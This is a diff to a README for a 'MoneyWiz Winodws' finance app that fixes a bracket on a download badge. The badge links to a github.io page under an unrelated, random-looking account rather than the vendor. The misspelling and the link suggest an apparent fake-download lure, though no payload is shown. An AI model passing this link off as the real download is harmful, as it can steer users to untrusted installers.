@@ -1,6 +1,6 @@
 # MoneyWiz Winodws - Personal Finance, Budgeting, and Account Tracking Across Devices
 
-[![Download MoneyWiz](https://img.shields.io/badge/Download-MoneyWiz_Finance_App-success?style=for-the-badge&logo=wallet)](https://claytonsellersfqjh.github.io/.github/moneywiz-windows
+[![Download MoneyWiz](https://img.shields.io/badge/Download-MoneyWiz_Finance_App-success?style=for-the-badge&logo=wallet)](https://claytonsellersfqjh.github.io/.github/moneywiz-windows)
 
 ## MoneyWiz in a Finance Workflow
 
